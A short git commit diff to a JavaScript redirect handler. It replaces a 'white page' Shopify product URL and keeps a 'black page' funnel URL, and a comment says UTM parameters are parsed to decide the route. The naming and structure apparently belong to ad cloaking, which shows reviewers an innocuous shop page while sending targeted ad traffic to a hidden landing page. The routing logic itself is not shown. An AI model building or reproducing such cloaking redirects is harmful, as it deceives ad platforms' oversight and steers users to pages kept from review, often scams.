3ca4cc37029c9e9fa4f00f619313aeea5518e233
Asif-Moon <asifaslam.ch94@gmail.com>
2025-03-05 06:19:21 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://gigissplace.myshopify.com/products/summer-tracksuit-women-fashion-suit-female-stand-neck-puff-sleeve-temperament-two-piece-set-female-wide-leg-denim-shorts-women";
+    const whitePageURL = "https://flagnorfail.myshopify.com/collections/womens-tops/products/bomber-jacket-black";
     const blackPageURL = "https://adffuaorrd.myfunnelish.com/jj-dd-spr-1738364604529104-1738364997483090-1739239513447558-1740098104992791";
   
     // Parse the UTM parameters from the request URL
